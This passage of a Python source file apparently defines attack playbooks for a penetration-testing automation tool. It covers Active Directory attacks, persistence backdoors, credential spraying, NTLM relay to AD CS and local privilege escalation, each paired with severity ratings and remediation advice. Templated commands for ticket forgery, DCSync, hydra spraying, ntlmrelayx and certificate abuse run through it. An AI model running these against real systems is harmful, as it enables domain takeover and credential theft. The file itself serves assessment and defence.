                  impact="A privileged account can replicate every domain secret "
                         "(all NT hashes incl. krbtgt) — complete domain compromise.",
                  recommendation="Restrict replication (DS-Replication-Get-Changes) to DCs, "
                         "tier admin accounts, and rotate krbtgt twice."),
            _step(2, "Forge a golden ticket", "have hashes",
                  "ticketer (set krbtgt hash + domain SID)", ["hash"], ["golden"],
                  "ticketer -nthash <krbtgt> -domain-sid <SID> Administrator → golden TGT "
                  "for full-domain persistence.", "final",
                  severity="Critical", cvss="9.8",
                  finding_title="Golden Ticket Possible — krbtgt Compromised",
                  impact="A recovered krbtgt hash lets an attacker forge Kerberos tickets for "
                         "any identity indefinitely — persistence that survives a password "
                         "reset of every other account.",
                  recommendation="Rotate the krbtgt password TWICE (with the recommended "
                         "interval) and treat krbtgt exposure as a full-domain compromise."),
        ],
    },
    {
        "id": "domain-persistence",
        "name": "Domain persistence & backdoors (post-Domain Admin)",
        "summary": "After Domain Admin, plant durable persistence — and find backdoors an "
                   "attacker may have left: Silver/Diamond tickets, a DCSync-rights backdoor, "
                   "a Golden Certificate (stolen CA key), AdminSDHolder, DCShadow and Skeleton "
                   "Key. (The Golden Ticket finding fires from the DCSync step.)",
        "match": {"any_ports": [88, 389], "signals": []},
        "run": {},
        "steps": [
            _step(1, "Silver Ticket — service / computer account", "have hashes",
                  "ticketer -nthash <machine/svc hash> -spn <spn> (forge service ticket)",
                  ["hash"], [],
                  "With a service or computer account hash, forge a service ticket (silver) "
                  "for that SPN and access the service as any user — never touches the DC, so "
                  "quieter than a golden ticket."),
            _step(2, "Backdoor: grant DCSync rights", "have credential",
                  "dacledit / bloodyAD add DS-Replication-Get-Changes[-All] to a controlled user",
                  ["credential"], [],
                  "Grant a low-profile account replication rights on the domain object so it "
                  "can DCSync forever with NO privileged-group membership — a stealthy backdoor "
                  "to hunt for and remove."),
            _step(3, "Backdoor: AdminSDHolder ACE", "have credential",
                  "bloodyAD / dacledit add an ACE on CN=AdminSDHolder,CN=System",
                  ["credential"], [],
                  "A rogue ACE on AdminSDHolder is re-applied by SDProp to every protected "
                  "group (Domain Admins, …) every ~60 min, restoring the attacker's rights "
                  "even after cleanup."),
            _step(4, "Golden Certificate — steal the CA key", "have credential",
                  "certipy ca -backup → certipy forge (offline cert for any user)",
                  ["credential"], [],
                  "Back up the CA's private key (certipy ca -backup) then forge authentication "
                  "certificates for ANY user offline — survives password resets AND krbtgt "
                  "rotation; only fixed by re-keying the CA."),
            _step(5, "DCShadow / Skeleton Key", "have credential",
                  "mimikatz lsadump::dcshadow / misc::skeleton (on the DC)", ["credential"], [],
                  "DCShadow registers a rogue DC to push legitimate-looking directory changes "
                  "(SID history, ACLs); Skeleton Key patches LSASS on the DC so a master "
                  "password authenticates as anyone (in-memory, until reboot).", "final"),
        ],
    },
    {
        "id": "acl-abuse",
        "name": "Abusable AD ACLs → privilege escalation",
        "summary": "Find objects your account can write (GenericAll/WriteDACL/GenericWrite/"
                   "ForceChangePassword) and abuse them: targeted Kerberoast, shadow "
                   "credentials, group add, or password reset.",
        "match": {"any_ports": [389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Collect the ACL graph (BloodHound)", "have credential",
                  "bloodhound_python", ["credential"], [],
                  "Collect users/groups/ACLs so you can see which principals your account "
                  "has dangerous rights over."),
            _step(2, "Enumerate writable objects", "have credential", "bloodyad",
                  ["credential"], ["acl_write"],
                  "bloodyAD get writable — list every object your account can modify.",
                  severity="High", cvss="8.1",
                  finding_title="Abusable Active Directory ACLs (GenericAll / WriteDACL / …)",
                  impact="The account holds dangerous write rights over other principals, "
                         "allowing takeover via targeted Kerberoast, shadow credentials, "
                         "group membership, or a password reset — often up to Domain Admin.",
                  recommendation="Audit and remove excessive ACEs (GenericAll/WriteDACL/"
                         "WriteOwner/GenericWrite/ForceChangePassword); apply least privilege "
                         "and tiering; monitor DACL changes."),
            _step(3, "Targeted Kerberoast the writable users", "have credential",
                  "targeted_kerberoast", ["acl_write", "credential"], ["spn_hash"],
                  "Set an SPN on each user you can write, roast it, then remove the SPN — "
                  "yields a crackable ticket without touching their password."),
            _step(4, "Crack the tickets", "have hashes", "crack_hashes",
                  ["spn_hash"], ["credential"],
                  "Crack the targeted-roast hashes offline.", "final"),
        ],
    },
    {
        "id": "shadow-credentials",
        "name": "Shadow Credentials (msDS-KeyCredentialLink)",
        "summary": "When you can write to a target account, add a key credential and "
                   "authenticate as it to recover its NT hash + TGT — no password reset.",
        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Add key + authenticate (certipy shadow auto)", "have credential",
                  "certipy_shadow", ["credential"], ["certificate", "hash"],
                  "certipy shadow auto -account <target$> — adds a KeyCredential, gets the "
                  "target's NT hash/TGT via PKINIT, then removes the key.", "final",
                  severity="High", cvss="8.1",
                  finding_title="Shadow Credentials (writable msDS-KeyCredentialLink)",
                  impact="Write access to a target's msDS-KeyCredentialLink lets an attacker "
                         "add a certificate key and impersonate the account (recovering its "
                         "hash/TGT) without resetting its password.",
                  recommendation="Restrict write access to msDS-KeyCredentialLink, deploy "
                         "and enforce a strong Key Trust / ADCS configuration, and monitor "
                         "KeyCredentialLink changes."),
        ],
    },
    {
        "id": "delegation-abuse",
        "name": "Kerberos delegation abuse",
        "summary": "Enumerate unconstrained / constrained / RBCD delegation and abuse it to "
                   "impersonate a privileged user (S4U2Self/Proxy) up to Domain Admin.",
        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Enumerate delegation", "have credential", "finddelegation",
                  ["credential"], ["delegation"],
                  "findDelegation: list accounts with unconstrained, constrained "
                  "(AllowedToDelegate) or resource-based delegation.",
                  severity="High", cvss="8.1",
                  finding_title="Kerberos Delegation Misconfiguration",
                  impact="Accounts with unconstrained/constrained/RBCD delegation can be "
                         "abused to impersonate any user (including Domain Admins) to the "
                         "delegated services, leading to domain compromise.",
                  recommendation="Remove unconstrained delegation; scope constrained "
                         "delegation tightly; restrict who can write "
                         "msDS-AllowedToActOnBehalfOfOtherIdentity; mark admins 'sensitive, "
                         "cannot be delegated' and add them to Protected Users."),
            _step(2, "Impersonate via S4U (constrained/RBCD)", "have credential",
                  "get_st (set spn + impersonate=Administrator)", ["delegation"],
                  ["ticket", "admin"],
                  "getST -spn <svc/target> -impersonate Administrator → .ccache; for "
                  "unconstrained, coerce a DC to the delegation host and extract its TGT.",
                  "final"),
        ],
    },
    {
        "id": "trust-abuse",
        "name": "Domain / forest trust abuse",
        "summary": "Enumerate trusts, then escalate child→parent (or across a forest trust) "
                   "with an inter-realm ticket carrying the parent Enterprise Admins SID.",
        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Enumerate domain/forest trusts", "have credential",
                  "netexec_ldap", ["credential"], ["trust"],
                  "LDAP query for trustedDomain objects — map parent/child and cross-forest "
                  "trusts and their attributes/direction.",
                  args={"action": "--query (objectClass=trustedDomain) *"},
                  severity="Medium", cvss="6.5",
                  finding_title="Abusable Domain / Forest Trust",
                  impact="An intra-forest (child→parent) trust — and a forest trust without "
                         "SID filtering — lets a child Domain Admin escalate to Enterprise "
                         "Admin / the trusting forest via SID history in a forged ticket.",
                  recommendation="Enable SID filtering / quarantine on trusts, treat the "
                         "forest (not the domain) as the security boundary, and tier admins."),
            _step(2, "Get the domain SID", "have credential", "lookupsid",
                  ["credential"], [],
                  "lookupsid → the domain SID needed to forge the inter-realm ticket."),
            _step(3, "Child → parent (extra-SID golden ticket)", "have credential",
                  "raisechild (or ticketer -extra-sid <parent>-519)",
                  ["hash", "trust"], ["ticket", "admin", "flag"],
                  "From child DA: dump child krbtgt, forge a TGT with the parent Enterprise "
                  "Admins SID (…-519) — Enterprise Admin on the forest root.", "final"),
        ],
    },
    {
        "id": "creds-in-ad",
        "name": "Credentials exposed in AD (GPP / description / LAPS)",
        "summary": "Harvest credentials that live in the directory: GPP cpassword in SYSVOL, "
                   "passwords in user description fields, and readable LAPS passwords.",
        "match": {"any_ports": [389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "GPP cpassword in SYSVOL", "have credential", "netexec_module",
                  ["credential"], ["gpp"],
                  "nxc smb -M gpp_password: decrypt cached Group Policy Preference passwords "
                  "from SYSVOL (AES key is public).", args={"protocol": "smb", "module": "gpp_password"},
                  severity="High", cvss="7.5",
                  finding_title="Credentials Exposed in AD (GPP / description / LAPS)",
                  impact="Reusable credentials are stored in the directory (GPP cpassword, "
                         "user description fields, or LAPS readable by too many principals), "
                         "recoverable by any domain user.",
                  recommendation="Remove GPP passwords (KB2962486), never store secrets in "
                         "description fields, and restrict LAPS read rights to admins."),
            _step(2, "Passwords in description fields", "have credential", "netexec_module",
                  ["credential"], ["gpp"],
                  "nxc ldap -M get-desc-users: dump user description fields (often hold "
                  "passwords).", args={"protocol": "ldap", "module": "get-desc-users"}),
            _step(3, "Readable LAPS passwords", "have credential", "netexec_module",
                  ["credential"], ["gpp"],
                  "nxc ldap -M laps: read LAPS local-admin passwords your account can see.",
                  "final", args={"protocol": "ldap", "module": "laps"}),
        ],
    },
    {
        "id": "privesc-ad",
        "name": "AD privilege escalation — map every path (authenticated user)",
        "summary": "From ONE unprivileged domain credential, enumerate and surface every "
                   "escalation path: Kerberoast, AS-REP, abusable ACLs, delegation, AD CS "
                   "(ESC), and credentials stored in the directory (GPP/description/LAPS).",
        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Enumerate the full user list", "have credential", "netexec_ldap",
                  ["credential"], ["userlist"],
                  "Authenticated LDAP dump of every domain user (feeds AS-REP roasting).",
                  args={"action": "--users"}),
            _step(2, "Collect the ACL / attack graph", "have credential",
                  "bloodhound_python", ["credential"], [],
                  "Collect users/groups/ACLs/sessions/trusts so every escalation edge from "
                  "this user is visible in BloodHound."),
            _step(3, "Kerberoastable service accounts", "have credential", "kerberoast",
                  ["credential", "domain"], ["spn_hash"],
                  "Roast SPN accounts — often privileged.",
                  severity="High", cvss="8.1",
                  finding_title="Kerberoastable Service Accounts",
                  impact="SPN service accounts can be roasted by any domain user and cracked "
                         "offline; they are frequently privileged.",
                  recommendation="Use gMSA or 25+ char random passwords for SPN accounts."),
            _step(4, "AS-REP roastable accounts", "have userlist", "asrep_roast",
                  ["userlist", "domain"], ["asrep_hash"],
                  "Roast accounts without Kerberos pre-auth (crackable, no creds needed).",
                  severity="High", cvss="7.5",
                  finding_title="AS-REP Roastable Accounts (Kerberos Pre-Authentication Disabled)",
                  impact="Accounts with pre-auth disabled yield crackable AS-REP hashes.",
                  recommendation="Enable Kerberos pre-authentication on all accounts."),
            _step(5, "Abusable ACLs over other principals", "have credential", "bloodyad",
                  ["credential"], ["acl_write"],
                  "bloodyAD get writable — objects this user can modify (GenericAll/WriteDACL/"
                  "GenericWrite/ForceChangePassword → takeover).",
                  severity="High", cvss="8.1",
                  finding_title="Abusable Active Directory ACLs (GenericAll / WriteDACL / …)",
                  impact="Dangerous write rights over other principals allow takeover via "
                         "targeted Kerberoast, shadow credentials, group add, or password reset.",
                  recommendation="Audit and remove excessive ACEs; apply least privilege and tiering."),
            _step(6, "Kerberos delegation", "have credential", "finddelegation",
                  ["credential"], ["delegation"],
                  "Unconstrained / constrained / RBCD delegation abusable to impersonate admins.",
                  severity="High", cvss="8.1",
                  finding_title="Kerberos Delegation Misconfiguration",
                  impact="Delegation lets an account impersonate any user (incl. Domain Admins) "
                         "to the delegated services.",
                  recommendation="Remove unconstrained delegation; scope constrained tightly; "
                         "protect admins (sensitive/Protected Users)."),
            _step(7, "AD CS vulnerable templates (ESC)", "have credential", "certipy_find",
                  ["credential", "domain"], ["adcs_vuln"],
                  "certipy find -vulnerable: ESC1-ESC8 templates enrollable as a privileged user.",
                  severity="High", cvss="8.1",
                  finding_title="AD CS Misconfiguration (Vulnerable Certificate Template)",
                  impact="A vulnerable AD CS template lets a low-priv user enroll a certificate "
                         "as Domain Admin — full domain compromise.",
                  recommendation="Remove enrollee-supplied-subject (ESC1), restrict enrollment, "
                         "enable manager approval, and audit templates."),
            _step(8, "Credentials stored in the directory (GPP)", "have credential",
                  "netexec_module", ["credential"], ["gpp"],
                  "GPP cpassword cached in SYSVOL (the AES key is public).",
                  args={"protocol": "smb", "module": "gpp_password"},
                  severity="High", cvss="7.5",
                  finding_title="Credentials Exposed in AD (GPP / description / LAPS)",
                  impact="Reusable credentials are stored in the directory (GPP cpassword, "
                         "description fields, or over-readable LAPS).",
                  recommendation="Remove GPP passwords (KB2962486), never store secrets in "
                         "description fields, restrict LAPS read rights."),
            _step(9, "Passwords in description fields", "have credential", "netexec_module",
                  ["credential"], ["gpp"],
                  "nxc ldap -M get-desc-users: user description fields often hold passwords.",
                  args={"protocol": "ldap", "module": "get-desc-users"}),
            _step(10, "Readable LAPS passwords", "have credential", "netexec_module",
                  ["credential"], ["gpp"],
                  "nxc ldap -M laps: LAPS local-admin passwords your account can read.",
                  args={"protocol": "ldap", "module": "laps"}),
            _step(11, "Crack what you roasted", "have hashes", "crack_hashes",
                  ["spn_hash", "asrep_hash"], ["credential"],
                  "Crack the AS-REP / Kerberoast hashes offline → a more privileged credential.",
                  "final"),
        ],
    },
    {
        "id": "privesc-local",
        "name": "Local Windows privilege escalation → SYSTEM",
        "summary": "From code execution on a host (e.g. an MSSQL service account or a shell), "
                   "escalate to SYSTEM via SeImpersonate (potato), service misconfigurations, "
                   "or stored credentials.",
        "match": {"any_ports": [445, 3389, 5985, 1433], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Host privilege & config triage", "have credential",
                  "win_privesc", ["credential"], [],
                  "Automated local-privesc enumeration on the host (needs local admin via "
                  "SMB 'Pwn3d!' or WinRM membership): token privileges (SeImpersonate → "
                  "potato, SeBackup), AlwaysInstallElevated, unquoted service paths, "
                  "autologon credentials, and UAC state — each reported as a finding."),
            _step(2, "Abuse SeImpersonatePrivilege → SYSTEM", "have credential",
                  "PrintSpoofer / GodPotato (on the host)", ["credential"], ["admin"],
                  "Service accounts (IIS/MSSQL) usually hold SeImpersonatePrivilege — "
                  "PrintSpoofer64.exe -i -c cmd (or GodPotato) impersonates SYSTEM. This is the "
                  "MSSQL foothold → SYSTEM step. (Documented: needs a shell on the host.)"),
            _step(3, "Service / path misconfigurations", "have credential",
                  "sc / accesschk (on the host)", ["credential"], ["admin"],
                  "Weak service ACLs (reconfigure binPath), unquoted service paths, or writable "
                  "%PATH% dirs → run a payload as the service (often SYSTEM).", "final"),
        ],
    },
    {
        "id": "ssh-access",
        "name": "SSH foothold → Linux local privilege escalation → root",
        "summary": "The Linux kill chain: get onto a host over SSH (spray recovered / "
                   "guessable credentials), then enumerate the local privilege-"
                   "escalation vectors and walk one to root. Read-only enumeration; "
                   "the escalation itself is documented per vector.",
        "match": {"any_ports": [22], "signals": []},
        "run": {},
        "steps": [
            _step(1, "SSH credential spray", "start", "hydra",
                  [], ["ssh_cred"],
                  "hydra ssh: spray a small set of usernames × common passwords (or "
                  "reuse recovered creds) to land a foothold. Intrusive — keep the "
                  "list small and mind lockout.",
                  args={"service": "ssh",
                        "userlist": "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
                        "passlist": "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"},
                  severity="High", cvss="8.1",
                  finding_title="SSH Weak / Guessable Credentials",
                  impact="An SSH account uses a weak or reused password, giving an "
                         "interactive foothold on the host.",
                  recommendation="Enforce key-based auth (PasswordAuthentication no), "
                         "strong passwords, fail2ban, and MFA."),
            _step(2, "Local privilege-escalation triage", "have credential",
                  "linux_privesc", ["credential"], [],
                  "Automated read-only linPEAS-style enumeration over SSH: abusable "
                  "sudo, GTFOBins SUID/SGID, dangerous capabilities, docker/lxd/disk "
                  "group, kernel/pkexec/sudo CVEs (PwnKit/Baron Samedit/DirtyPipe), "
                  "writable /etc/passwd, readable keys — each reported as a finding."),
            _step(3, "Reuse credentials & keys for lateral movement", "have credential",
                  "recovered password / private key → SSH to peers", ["credential"],
                  ["admin"],
                  "Reuse the recovered password and any readable private keys "
                  "(~/.ssh/id_*) to SSH into peer hosts — Linux credential reuse is "
                  "rampant.", "final"),
        ],
    },
    {
        "id": "privesc-linux",
        "name": "Linux local privilege escalation → root",
        "summary": "From an SSH credential on a Linux host, enumerate the local "
                   "privilege-escalation vectors and escalate to root — the Linux "
                   "counterpart of privesc-local. Read-only enumeration; each abusable "
                   "vector becomes a finding with its root path.",
        "match": {"any_ports": [22], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Host privilege & config triage", "have credential",
                  "linux_privesc", ["credential"], [],
                  "linux_privesc over SSH: sudo -l, SUID/SGID (GTFOBins), file "
                  "capabilities, docker/lxd/disk group, kernel/pkexec/sudo versions vs "
                  "local-root CVEs, writable /etc/passwd|shadow, world-writable cron, "
                  "readable private keys, writable $PATH — all read-only, each an "
                  "ATT&CK-tagged finding."),
            _step(2, "Escalate via the identified vector → root", "have credential",
                  "GTFOBins (sudo/SUID) / PwnKit / DirtyPipe / docker-mount (on the host)",
                  ["credential"], ["admin", "flag"],
                  "Walk the strongest finding to root: a GTFOBins sudo/SUID shell, the "
                  "PwnKit/Baron-Samedit/DirtyPipe exploit, a docker/lxd host mount, or "
                  "writing /etc/passwd. (Documented: run the exploit on the host.)",
                  "final"),
        ],
    },
    {
        "id": "sccm-attack",
        "name": "SCCM / MECM enumeration and abuse",
        "summary": "Find SCCM (Configuration Manager) infrastructure in AD, then recover "
                   "Network Access Account (NAA) credentials and take over the site — a "
                   "common path to Domain Admin in enterprises.",
        "match": {"any_ports": [389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Find SCCM infrastructure in AD", "have credential", "netexec_module",
                  ["credential"], ["sccm"],
                  "nxc ldap -M sccm: locate the SCCM Management Point / Site / Distribution "
                  "servers published in Active Directory.",
                  args={"protocol": "ldap", "module": "sccm"},
                  severity="Medium", cvss="6.5",
                  finding_title="SCCM / MECM Infrastructure Exposed",
                  impact="SCCM is a high-value target: Network Access Account credentials, "
                         "PXE boot media, and the admin service frequently lead to code "
                         "execution across managed endpoints and to Domain Admin.",
                  recommendation="Harden SCCM: enforce HTTPS/PKI + Enhanced HTTP, remove NAA "
                         "where possible (use Enhanced HTTP), restrict site-server admins, "
                         "and enable signing/encryption."),
            _step(2, "Fingerprint distribution / site servers", "have credential",
                  "netexec_module", ["sccm", "credential"], ["sccm"],
                  "nxc smb -M sccm-recon6: confirm whether a host is a Distribution Point or "
                  "Primary Site Server via the registry.",
                  args={"protocol": "smb", "module": "sccm-recon6"}),
            _step(3, "Recover NAA credentials", "have credential",
                  "sccmhunter (find → smb/http NAA extraction)", ["sccm", "credential"],
                  ["credential"],
                  "sccmhunter find then smb/http: recover the Network Access Account "
                  "credentials (often reused and privileged)."),
            _step(4, "Site takeover → Domain Admin", "have credential",
                  "sccmhunter admin (or ntlmrelayx to the site server)", ["credential"],
                  ["admin", "flag"],
                  "Relay a site-server coercion or abuse the admin service to add a full "
                  "administrator and push code to every managed device.", "final"),
        ],
    },
    {
        "id": "unauth-ad-roast",
        "name": "Unauthenticated AD credential exposure (pre2k / timeroast)",
        "summary": "With NO domain credentials, recover crackable secrets: pre-created "
                   "computer accounts whose password equals their name (pre2k) and computer/"
                   "trust account hashes via NTP (timeroast).",
        "match": {"any_ports": [88, 445], "signals": []},
        "run": {},
        "steps": [
            _step(1, "Timeroast computer/trust accounts (NTP, unauth)", "start",
                  "timeroast", [], ["hash"],
                  "timeroast <dc>: request NTP auth to extract computer/trust account "
                  "password hashes without any credential; crack offline (hashcat 31300)."),
            _step(2, "Pre-created (pre-2000) computer accounts", "start", "pre2k",
                  [], ["pre2k_hit", "credential"],
                  "pre2k unauth: computers whose password is the lowercase computer name — "
                  "a free machine-account foothold.",
                  severity="Medium", cvss="5.9",
                  finding_title="Pre-created (pre-Windows-2000) Computer Accounts",
                  impact="Pre-staged computer accounts keep a predictable password (the "
                         "lowercase computer name), giving an unauthenticated attacker a "
                         "machine-account foothold in the domain.",
                  recommendation="Reset or remove stale pre-created computer accounts and "
                         "avoid the 'assign as pre-Windows 2000 computer' option."),
            _step(3, "Crack what you recovered", "have hashes", "crack_hashes",
                  ["hash"], ["credential"],
                  "Crack the timeroast/pre2k hashes offline → a domain foothold.", "final"),
        ],
    },
    {
        "id": "password-policy",
        "name": "Weak domain password policy",
        "summary": "Read the domain password policy; flag a weak one (no complexity, short "
                   "minimum length, or no lockout) — the reason spraying and guessing work.",
        "match": {"any_ports": [445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Read the account/password policy", "have credential", "netexec_smb",
                  ["credential"], ["weak_policy"],
                  "netexec_smb --pass-pol: minimum length, complexity flags, and lockout "
                  "threshold.", args={"enumerate": "pass-pol"},
                  severity="Medium", cvss="5.3",
                  finding_title="Weak Domain Password Policy",
                  impact="A weak password policy (complexity disabled, short minimum length, "
                         "or no account lockout) makes password guessing and spraying "
                         "effective and lets users pick trivially weak passwords.",
                  recommendation="Enforce 14+ character minimum, enable complexity, set a "
                         "lockout threshold, and deploy a banned-password list / FGPP for "
                         "privileged accounts."),
        ],
    },
    {
        "id": "dpapi-loot",
        "name": "DPAPI secret extraction (post-admin)",
        "summary": "With local-admin access, dump DPAPI-protected secrets — saved browser "
                   "and Windows credentials, Wi-Fi keys, and scheduled-task passwords.",
        "match": {"any_ports": [445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Dump DPAPI secrets", "have credential", "netexec_module",
                  ["credential"], ["dpapi_secret", "credential"],
                  "netexec smb -M dpapi_hash (needs local admin): decrypt masterkeys and "
                  "recover stored credentials from DPAPI.",
                  "final", args={"protocol": "smb", "module": "dpapi_hash"},
                  severity="High", cvss="7.5",
                  finding_title="Credentials Recoverable via DPAPI",
                  impact="A local administrator can decrypt DPAPI-protected secrets (browser "
                         "and Windows saved credentials, Wi-Fi keys, task passwords), often "
                         "yielding reusable credentials for lateral movement.",
                  recommendation="Limit local-admin exposure, use credential-guard, avoid "
                         "storing reusable secrets in browsers/tasks, and rotate on compromise."),
        ],
    },
    {
        "id": "relay-adcs-esc8",
        "name": "Coerce → NTLM relay → AD CS ESC8 → Domain Admin",
        "summary": "The classic no-fix chain: coerce a DC to authenticate, relay that NTLM "
                   "to the AD CS web-enrollment endpoint (ESC8), obtain a certificate for "
                   "the DC machine account, and use it to DCSync the domain.",
        "match": {"any_ports": [445, 88], "signals": []},
        "run": {},
        "steps": [
            _step(1, "Confirm the host is coercible", "start", "netexec_module",
                  [], ["coerced"],
                  "nxc smb -M coerce_plus: verify MS-RPRN/MS-EFSR/MS-DFSNM coercion is "
                  "available (the trigger for the relay).",
                  args={"protocol": "smb", "module": "coerce_plus"},
                  severity="High", cvss="8.1",
                  finding_title="Authentication Coercion (PrinterBug / PetitPotam)",
                  impact="A DC/host can be coerced to authenticate to an arbitrary target, "
                         "feeding an NTLM relay to AD CS ESC8 for domain compromise.",
                  recommendation="Patch coercion vectors, disable the Print Spooler on DCs, "
                         "enforce EPA/HTTPS on AD CS, and disable NTLM."),
            _step(2, "Find AD CS web enrollment (ESC8)", "have credential", "certipy_find",
                  ["credential", "domain"], ["adcs_vuln"],
                  "certipy find -vulnerable: ESC8 = the CA's HTTP web-enrollment endpoint "
                  "accepts relayed NTLM. (Needs DNS pointed at a DC.)",
                  severity="High", cvss="8.1",
                  finding_title="AD CS Misconfiguration (Vulnerable Certificate Template)",
                  impact="An HTTP web-enrollment endpoint (ESC8) lets relayed NTLM enrol a "
                         "certificate as a privileged account — full domain compromise.",
                  recommendation="Require HTTPS + Extended Protection for Authentication on "
                         "the CA web enrollment, or disable it."),
            _step(3, "Relay coerced auth to the CA (ntlmrelayx --adcs)", "have credential",
                  "ntlm_relay (mode=adcs — auto-orchestrates listener + coercion; run as root)",
                  ["coerced", "adcs_vuln"], ["certificate"],
                  "Autopwn's built-in ntlm_relay tool starts ntlmrelayx --adcs, coerces the DC "
                  "into it, and captures the DC's certificate automatically. Run as root "
                  "against the launch target: sudo autopwn run --tool ntlm_relay --set "
                  "target=<DC> --set relay_to=<CA host> --set mode=adcs. Both hosts must be in "
                  "scope. (In-console it stays documentation because the web service is "
                  "non-root and can't bind 445.)"),
            _step(4, "Authenticate with the DC certificate → DCSync", "have credential",
                  "certipy_auth (use the relayed DC cert) → secretsdump -k", ["certificate"],
                  ["hash", "admin", "flag"],
                  "certipy auth -pfx dc.pfx → the DC's NT hash + TGT; then secretsdump -k / "
                  "DCSync for the whole domain. This is the ESC8 → Domain Admin finish.",
                  "final"),
        ],
    },
    {
        "id": "adcs-certighost",
        "name": "Certighost — AD CS DC impersonation → Domain Admin (CVE-2026-54121)",
        "summary": "The 2026 AD CS 'chase' abuse: from a single low-privileged domain "
                   "user, create a machine account, stand up attacker-controlled LDAP + "
                   "LSA listeners, and request a certificate with poisoned cdc/rmd "
                   "attributes so the unpatched CA issues a *Domain Controller* "
                   "certificate. PKINIT as that DC, then DCSync the krbtgt — full domain "
                   "takeover from one credential. Needs an Enterprise CA and "
                   "MachineAccountQuota>0 (default 10). Patched in the July 2026 CU.",
        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Find the Enterprise CA + enrollment", "have credential",
                  "certipy_find", ["credential", "domain"], ["adcs_vuln"],
                  "certipy find: locate the Enterprise CA and its enrollment endpoints. "
                  "Certighost abuses the CA's directory-object 'chase' fallback, so any "
                  "reachable Enterprise CA is in scope until the July 2026 CU is applied."),
            _step(2, "Certighost chase → DC certificate → DC hash", "have credential",
                  "certighost", ["credential", "domain"], ["certighost"],
                  "The vendored certighost tool (run as ROOT, with TCP 445+389 free) does "
                  "the whole chain: create a machine account, stand up rogue LDAP+LSA/SMB "
                  "listeners, and request a certificate whose poisoned cdc (Client DC) / "
                  "rmd (Remote Domain) attributes make the unpatched CA 'chase' the "
                  "attacker host and issue a Domain Controller certificate — then PKINIT "
                  "as that DC and recover its NT hash. Prints '[*] GGWP' on success. PoC: "
                  "gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26.",
                  # Enrol via 'Machine' (Computer) — the GHOST$ machine account can enrol
                  # in it; a DC-only template (e.g. KerberosAuthentication, which
                  # certipy_find harvests) gets 'Denied by Policy Module'.
                  args={"template": "Machine"},
                  severity="Critical", cvss="9.0",
                  finding_title="Certighost — AD CS Domain Controller Impersonation (CVE-2026-54121)",
                  impact="Any authenticated domain user can coerce the AD CS CA into "
                         "issuing a certificate for a Domain Controller via the enrollment "
                         "'chase' fallback, then authenticate as that DC (PKINIT) and "
                         "DCSync the domain — recovering krbtgt and every secret. A single "
                         "low-privileged credential yields full domain compromise.",
                  recommendation="Apply the July 14 2026 cumulative update (e.g. KB5099540 "
                         "/ build >= 10.0.20348.5386 on Server 2022). If patching is "
                         "delayed, disable the chase fallback (clear "
                         "EDITF_ENABLECHASECLIENTDC) and restrict the CA's outbound access "
                         "to approved DCs. Monitor CA events 4886/4887 for cdc/rmd request "
                         "attributes and 4768 for certificate TGTs from non-DC hosts; "
                         "revoke suspicious certs and reset krbtgt twice if abuse is "
                         "confirmed."),
            _step(3, "DCSync the domain with the DC hash", "have credential",
                  "secretsdump", ["certighost"], ["hash", "admin", "golden", "flag"],
                  "certighost recovered the DC machine account's NT hash (harvested into "
                  "the run); DCSync the domain with it (secretsdump -just-dc-ntlm, "
                  "pass-the-hash as the DC account) — dumping krbtgt, Administrator and "
                  "every domain secret. Administrator's hash then opens an interactive "
                  "session; krbtgt enables a Golden Ticket (reset it twice to evict).",
                  "final", args={"just_dc": "true"}),
        ],
    },
    {
        "id": "ad-cve-check",
        "name": "Critical AD CVE checks (ZeroLogon / noPac / PrintNightmare / …)",
        "summary": "Safely CHECK a DC/host for the well-known critical AD vulnerabilities "
                   "that grant Domain Admin or SYSTEM in one shot. Non-destructive checks "
                   "via NetExec modules — a finding fires only for what is actually vulnerable.",
        "match": {"any_ports": [445], "signals": []},
        "run": {},
        "steps": [
            _step(1, "ZeroLogon (CVE-2020-1472)", "start", "netexec_module",
                  [], ["zerologon_vuln"],
                  "nxc smb -M zerologon: check the Netlogon flaw that resets the DC "
                  "machine password → instant Domain Admin. (Check only, non-destructive.)",
                  args={"protocol": "smb", "module": "zerologon"},
                  severity="Critical", cvss="10.0",
                  finding_title="ZeroLogon — Domain Controller Vulnerable (CVE-2020-1472)",
                  impact="An unauthenticated attacker can reset the DC machine account "
                         "password and immediately obtain Domain Admin / DCSync.",
                  recommendation="Apply the August 2020+ patches and enforce Netlogon "
                         "secure-channel enforcement mode."),
            _step(2, "noPac (CVE-2021-42278/42287)", "have credential", "netexec_module",
                  ["credential"], ["nopac_vuln"],
                  "nxc smb -M nopac: sAMAccountName spoofing lets a standard user impersonate "
                  "a DC and reach Domain Admin.",
                  args={"protocol": "smb", "module": "nopac"},
                  severity="Critical", cvss="9.0",
                  finding_title="noPac / sAMAccountName Spoofing (CVE-2021-42278/42287)",
                  impact="Any authenticated user can escalate to Domain Admin by spoofing "
                         "a domain controller's account name.",
                  recommendation="Apply the November 2021 patches; set ms-DS-Machine-"
                         "AccountQuota to 0 as defence in depth."),
            _step(3, "PrintNightmare (CVE-2021-34527)", "have credential", "netexec_module",
                  ["credential"], ["printnightmare_vuln"],
                  "nxc smb -M printnightmare: Print Spooler RCE → SYSTEM on the host.",
                  args={"protocol": "smb", "module": "printnightmare"},
                  severity="High", cvss="8.8",
                  finding_title="PrintNightmare — Print Spooler RCE (CVE-2021-34527)",
                  impact="The Print Spooler allows remote code execution as SYSTEM; on a DC "
                         "this is domain compromise.",
